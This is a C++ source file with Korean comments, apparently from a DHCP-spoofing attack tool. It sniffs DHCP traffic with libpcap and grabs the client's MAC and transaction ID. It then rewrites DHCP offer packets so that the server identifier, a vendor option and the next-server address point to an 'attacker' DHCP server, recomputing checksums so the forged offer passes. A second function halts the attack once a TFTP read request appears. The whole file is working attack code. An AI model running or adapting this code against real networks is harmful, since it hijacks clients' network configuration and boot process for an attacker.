#include "detect_packet.h"

bool detect_parsing_packet(parse *ps)//void -> bool //discover 패킷과 offer패킷 탐지와 
{
    pcap_t *pcd;
    const u_char *packet;
    struct pcap_pkthdr *pkthdr;
    int res;
    char errbuf[PCAP_ERRBUF_SIZE];
    pcd=pcap_open_live(ps->using_interface(), BUFSIZ, 1, 1, errbuf);
    int check{0},check2{0};
    while(true)
    {
        res=pcap_next_ex(pcd, &pkthdr, &packet);
        if(pkthdr->len<=0 || (check==1 && check2==1))  //check 값이 둘 다 1일때 함수 종료
            return true;// break -> return true
        switch (res)
        {
            case 1:
            {
                struct ether_header *ep = (struct ether_header *)packet;
                if(ep->ether_type==ntohs(0x0800))
                {
                    packet+=sizeof(struct ether_header);
                    struct iphdr *ip = (struct iphdr *)packet;
                    if(ip->protocol!=0x11)
                        break;
                    packet+=ip->ihl*4;
                    struct udphdr *up = (struct udphdr *)packet;
                    packet +=sizeof(struct udphdr);
                    struct bootstrap *bs = (struct bootstrap *)packet;
                    uint8_t *bspoint_packet=(uint8_t*)packet;
                    bspoint_packet+=sizeof(struct bootstrap);

                    uint8_t option=*bspoint_packet;
                    uint8_t *temp_pointer;

                    if(bs->message_type==0x01) //discover
                    {
                        ps->parse_client_mac(ep->ether_shost);
                        ps->parse_transaction_id(bs->transaction_id);
                        check=1;
                        cout << ">> Client mac is parsed" << endl;

                    }
                    else if(bs->message_type==0x02) //offer
                    {
                        if(ip->saddr!=*ps->using_attacker_dhcp_server_ip() ||
                                memcmp(ep->ether_shost,ps->using_attacker_dhcp_server_mac(),6)!=0)//add
                            break;
                        memcpy(ps->origin_dhcp_mac,ep->ether_shost,6);
                        ps->origin_dhcp_ip=ip->saddr;
                        while(option!=DHCP_OPTION_END)
                        {
                            uint8_t length{0};
                            switch (option)
                            {
                                case DHCP_OPTION_DHCP_SERVER_IDENTIFIER:
                                {
                                    bspoint_packet++;
                                    length=*bspoint_packet;
                                    memcpy(bspoint_packet+1,ps->using_attacker_dhcp_server_ip(),4);
                                    bspoint_packet+=length;
                                    option=*(bspoint_packet+1);
                                    bspoint_packet++;
                                }
                                break;
                                case DHCP_OPTION_VENDOR_ENCAPSULATED_OPTIONS:
                                {
                                    temp_pointer=bspoint_packet;
                                    bspoint_packet+=2;
                                    while(true)
                                    {
                                        length=0;
                                        if(*bspoint_packet==8)
                                        {
                                            bspoint_packet+=5;
                                            memcpy(bspoint_packet,ps->using_attacker_dhcp_server_ip(),4);
                                            break;
                                        }
                                        bspoint_packet++;
                                        length=*bspoint_packet;
                                        bspoint_packet++;
                                        bspoint_packet+=length;
                                    }
                                    bspoint_packet=temp_pointer;
                                    bspoint_packet++;
                                    length=*bspoint_packet;
                                    bspoint_packet+=length;
                                    option= *(bspoint_packet+1);
                                }
                                break;
                                default:
                                {
                                    bspoint_packet++;
                                    length=*bspoint_packet;
                                    bspoint_packet+=length;
                                    option= *(bspoint_packet+1);
                                    bspoint_packet++;
                                }
                                break;
                            }
                        }
                        cal_checksum cc;
                        cout << ">> Data modify Complete" << endl; //데이터 변조 끝
                        ps->make_dhcp_arr_space(MTU);
                        ps->get_dhcp_data_length(ntohs(up->len)-sizeof(struct udphdr));
                        ps->get_dhcp_data((uint8_t*)packet);
                        ps->make_dhcp_length(sizeof(struct ether_header)+ntohs(ip->tot_len));

                        cout << ">> DHCP Offer data is parsed" << endl; //offer패킷에서 필요한 부분 파씽완료

                        memcpy(ep->ether_shost,ps->using_attacker_dhcp_server_mac(),6);
                        ps->make_dhcp_packet((uint8_t*)ep,sizeof(struct ether_header),false);
                        ps->pre_packet_length=sizeof(struct ether_header);
                        ip->saddr=*ps->using_attacker_dhcp_server_ip();

                        //ip checksum
                        cc.get_iphdr(ip);
                        ip->check=htons(cc.checksum(ipchecksum)); //
                        ps->make_dhcp_packet((uint8_t*)ip,ip->ihl*4,true);
                        ps->pre_packet_length+=ip->ihl*4;
                        bs->transaction_id=*ps->using_transaction_id();

                        //udp checksum
                        bs->next_server_ip_addr=*ps->using_attacker_dhcp_server_ip();
                        cc.get_udphdr(up);
                        cc.get_pesudo(udpchecksum);
                        up->check=htons(cc.checksum(udpchecksum));
                        ps->make_dhcp_packet((uint8_t*)up,sizeof(struct udphdr),true);//udp 데이터 패킷 생성
                        ps->pre_packet_length+=sizeof(struct udphdr);//udp 패킷뒤에 bootstrap이 붙음으로 길이 측정해놓음
                        ps->make_dhcp_packet((uint8_t*)bs,ps->using_dhcp_data_length(),true);//bootstrap 데이터 패킷 생성 
                        //ps->show_dhcp_packet();
                        check2=1;
                        //패킷 데이터를 공격자의 데이터로 변조
                    }
                }
            }
            break;
            case 0:
                continue;
            case -1:
            {
                printf(">> Error!!\n");
                pcap_close(pcd);
                sleep(1);
                pcd = pcap_open_live(ps->using_interface(), BUFSIZ, 1 , 1, errbuf);
            }
            break;
            case -2:
                printf("EOF");
            break;
            default:
            break;
        }
    }
}
void detect_tftp_packet(parse *ps, atomic<bool> &run) //tftp 발생시 공격 중지
{
    char errbuf[PCAP_ERRBUF_SIZE];
    const u_char *packet;
    struct pcap_pkthdr *pkthdr;
    int res;
    pcap_t *pcd;
    pcd=pcap_open_live(ps->using_interface(), BUFSIZ, 1, 1, errbuf);
    while(run)
    {
        res=pcap_next_ex(pcd, &pkthdr, &packet);
        switch (res)
        {
            case 1:
            {
                packet+=sizeof(ether_header);
                struct iphdr *iph = (struct iphdr*)packet;
                packet+=iph->ihl*4;
                if(iph->protocol!=0x11)
                    break;
                packet+=sizeof(udphdr);
                if(memcmp(packet,&ps->read_request,2)==0)
                {
                    cout << "TFTP Detect !!"<<endl;
                    run=false;
                }
            }
            break;
            case 0:
                continue;
            case -1:
            {
                printf(">> Error!!\n");
                pcap_close(pcd);
                sleep(1);
                pcd = pcap_open_live(ps->using_interface(), BUFSIZ, 1 , 1, errbuf);
            }
            break;
            case -2:
                printf("EOF");
            break;
            default:
            break;
        }
    }
}
